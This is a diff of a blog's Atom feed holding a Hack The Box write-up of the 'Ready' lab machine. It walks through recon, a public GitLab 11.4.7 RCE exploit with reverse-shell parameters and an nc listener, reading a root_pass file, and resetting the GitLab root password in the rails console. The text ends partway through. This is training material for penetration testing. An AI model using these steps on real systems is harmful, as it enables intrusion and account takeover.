@@ -1,4 +1,286 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-03-27T19:46:11+01:00</updated><id>/feed.xml</id><title type="html">CTF Writeups &amp;amp; Tech Stuff</title><subtitle>HTB Writeups and other techhie stuff</subtitle><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><entry><title type="html">HTB Writeup - Luanne</title><link href="/posts/HTB-Writeup-Luanne" rel="alternate" type="text/html" title="HTB Writeup - Luanne" /><published>2021-03-18T19:36:34+01:00</published><updated>2021-03-18T19:36:34+01:00</updated><id>/posts/HTB-Writeup:-Luanne</id><content type="html" xml:base="/posts/HTB-Writeup-Luanne">&lt;p&gt;&lt;img src=&quot;/assets/images/7a4a9e4198292175421007edb1724a11.png&quot; alt=&quot;7a4a9e4198292175421007edb1724a11&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-03-31T00:32:11+02:00</updated><id>/feed.xml</id><title type="html">CTF Writeups &amp;amp; Tech Stuff</title><subtitle>HTB Writeups and other techhie stuff</subtitle><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><entry><title type="html">HTB Writeup - Ready</title><link href="/posts/HTB-Writeup-Ready" rel="alternate" type="text/html" title="HTB Writeup - Ready" /><published>2021-03-31T01:18:00+02:00</published><updated>2021-03-31T01:18:00+02:00</updated><id>/posts/HTB-Writeup:-Ready</id><content type="html" xml:base="/posts/HTB-Writeup-Ready">&lt;p&gt;A fun and well made box, where 80% of the time was spent enumerating and the remaining 20% split on easy foothold and root privesc.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; I am in no way an expert in the matter, been learning netsec and pentesting on the side by doing these boxes on HTB and watching an obscene amount of IppSec videos. What I am writing is simply my though process and might not be the most optimal solution, I find this method of writing good for self-education purposes. In fact, I try to write in the order I did everything, so you might see me bouncing back and forth between services.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+
+&lt;p&gt;We start with the standard &lt;strong&gt;nmap&lt;/strong&gt; scan on 10.10.10.220:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/ready 10.10.10.220
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;stbl: 
+Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-03-22 22:51 CET
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.220
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.033s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+5080/tcp open  http    nginx
+| http-robots.txt: 53 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/edit /users /help 
+|_/s/ /snippets/new /snippets/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/edit
+| http-title: Sign &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;C2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;B7 GitLab
+|_Requested resource was http://10.10.10.220:5080/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;13.51 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So here we are presented with a fairly up-to-date OpenSSH and &lt;em&gt;nginx&lt;/em&gt; instance running on port 5080, which nmap already identified as being a &lt;strong&gt;GitLab&lt;/strong&gt; machine. &lt;em&gt;This is convenient as I recently did Laboratory, which also revolved around GL.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;We have a quick check at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file present, but it turns out to be the standard GitLab-supplied robots file.&lt;/p&gt;
+
+&lt;p&gt;We start a &lt;strong&gt;gobuster&lt;/strong&gt; recon on the server while we start manually going through the GitLab instance.&lt;/p&gt;
+
+&lt;h3 id=&quot;http-5080---gitlabs-recon&quot;&gt;HTTP (5080 - GitLabs) Recon&lt;/h3&gt;
+
+&lt;p&gt;First thing we do on the GitLab login page is to attempt creating a user. This is successful and we land on the user dashboard. We know from &lt;em&gt;Laboratory&lt;/em&gt;  that GitLab is supposed to disclose its version on the &lt;em&gt;Help&lt;/em&gt; page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-22_23-11-21.png&quot; alt=&quot;Screenshot_2021-03-22_23-11-21&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we are dealing with version &lt;strong&gt;&lt;em&gt;11.4.7&lt;/em&gt;&lt;/strong&gt;, for which a quick &lt;strong&gt;searchsploit&lt;/strong&gt; search reveals to be quite vulnerable to RCE:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CVE-2018-19571 + CVE-2018-19585&lt;/li&gt;
+  &lt;li&gt;https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We decide to go with the latter. and start exploiting the GitLab service.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation---gitlab&quot;&gt;Exploitation - GitLab&lt;/h2&gt;
+
+&lt;p&gt;The python exploit we picked is fairly straightforward and requires a few parameters to be filled:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Sign in GitLab 11.4.7  portal and get (using Burp or something other):
+# authenticity_token
+# authenticated cookies
+# username
+# specify localport and localip for reverse shell
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'aaaaaaaaaaaa'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;authenticity_token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'jpT/n1EoPwwWtiGu/+QKVQomofMNyqAQXY+iD2kVoRQoiQNzcFHPAj2+M4pyblKo/7UkClKW8jvp51Aw2qzs7g=='&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'_gitlab_session=c942527505cc0580c026610a1799b811; sidebar_collapsed=false'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;localport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'1234'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;localip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'192.168.0.114'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Where the:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;username&lt;/em&gt; is whom we signed-up with&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;em&gt;authenticity_token&lt;/em&gt; is extracted from &lt;strong&gt;burp&lt;/strong&gt; (or just in the source really) as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf-token&lt;/code&gt; : &lt;img src=&quot;/assets/images/Screenshot_2021-03-30_23-02-24.png&quot; alt=&quot;Screenshot_2021-03-30_23-02-24&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;cookie&lt;/em&gt; is taken from the headers in burp again.&lt;/li&gt;
+  &lt;li&gt;And finally, our local IP and port listening.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;getting-a-shell-back&quot;&gt;Getting a Shell Back&lt;/h3&gt;
+
+&lt;p&gt;We setup a listener with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lvnp&lt;/code&gt; and run the python3 exploit.&lt;/p&gt;
+
+&lt;p&gt;As expected, we gain a shell back (actually two; the exploit script itself will also spawn a shell):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-22_23-31-11.png&quot; alt=&quot;Screenshot_2021-03-22_23-31-11&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;h3 id=&quot;git-to-root-docker&quot;&gt;git to root (docker)&lt;/h3&gt;
+
+&lt;p&gt;As usual, we start by elevating our basic shell to a full tty:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import pty;pty.spawn('/bin/bash')&quot;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# ctrl+z&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;fg
+ls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We find that we are system user &lt;strong&gt;git&lt;/strong&gt; and landed in the directory &lt;strong&gt;/var/opt/gitlab/gitlab-rails/working&lt;/strong&gt;, which is expected  for GitLab instances.&lt;/p&gt;
+
+&lt;p&gt;Although no needed, we grab some information from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret.yaml&lt;/code&gt; in the &lt;em&gt;~/gitlab-rails/etc/&lt;/em&gt; folder, but did not ended up having to use any of it. In the same folder, we also notice a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database.yml&lt;/code&gt; file, which appears to be containing &lt;strong&gt;postgresql&lt;/strong&gt; information, but we can only get host information and port from it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  username: &lt;span class=&quot;s2&quot;&gt;&quot;gitlab&quot;&lt;/span&gt;
+  password: 
+  host: &lt;span class=&quot;s2&quot;&gt;&quot;/var/opt/gitlab/postgresql&quot;&lt;/span&gt;
+  port: 5432
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;nothing really crucial here. enumerating further, we find an interesting file at the root of the filesystem; a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root_pass&lt;/code&gt;. We are able to read it so we grab its content:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@gitlab:~/gitlab-rails/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root_pass 
+YG65407Bjqvv9A0a8Tm_7w
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We immediately try this password on the box itself with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su -&lt;/code&gt;, but are unable to authenticate.  The other files on the file system suggest we are in a docker container. We verify for additional users on the machine with shell access and found an uncommon &lt;strong&gt;dude&lt;/strong&gt; user:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-22_23-55-38.png&quot; alt=&quot;Screenshot_2021-03-22_23-55-38&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We go see in their directory and see we are able to grab the &lt;strong&gt;user.txt&lt;/strong&gt; flag. After this we decide to start running &lt;strong&gt;linpeas&lt;/strong&gt; on the machine and also go play around in the gitlab  rails console.&lt;/p&gt;
+
+&lt;h4 id=&quot;enumerating-with-the-gitlab-ruby-shell&quot;&gt;Enumerating with the Gitlab Ruby Shell&lt;/h4&gt;
+
+&lt;p&gt;We start the console with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitlab-rails console&lt;/code&gt; and start by enumerating some of the users:&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;------------------------------------------------------------------------------------&lt;/span&gt;
+ &lt;span class=&quot;no&quot;&gt;GitLab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;mf&quot;&gt;11.4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f8423&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+ &lt;span class=&quot;no&quot;&gt;GitLab&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;8.3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
+ &lt;span class=&quot;ss&quot;&gt;postgresql:   &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;9.6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-------------------------------------------------------------------------------------&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HISTORY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_a&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;Loading&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;production&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;environment&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Rails&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;4.2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HISTORY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_a&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HISTORY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_a&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;002&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#&amp;lt;User id:1 @root&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;003&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;count&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;004&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;active&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#&amp;lt;ActiveRecord::Relation [#&amp;lt;User id:3 @stbl&amp;gt;, #&amp;lt;User id:2 @pentest&amp;gt;, #&amp;lt;User id:1 @root&amp;gt;]&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;005&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;username&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;006&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;admin&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;007&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;created_at&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Fri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Dec&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2020&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;UTC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We see that we have a root user, who has admin right on the box. We attempt to login as &lt;em&gt;root&lt;/em&gt; in GitLab using the password we previously found. Instead, we now try to change &lt;em&gt;root&lt;/em&gt; password by using the console by running the following commands:&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ippsecrocks'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ippsecrocks&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;020&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;password_confirmation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ippsecrocks'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ippsecrocks&quot;&lt;/span&gt;
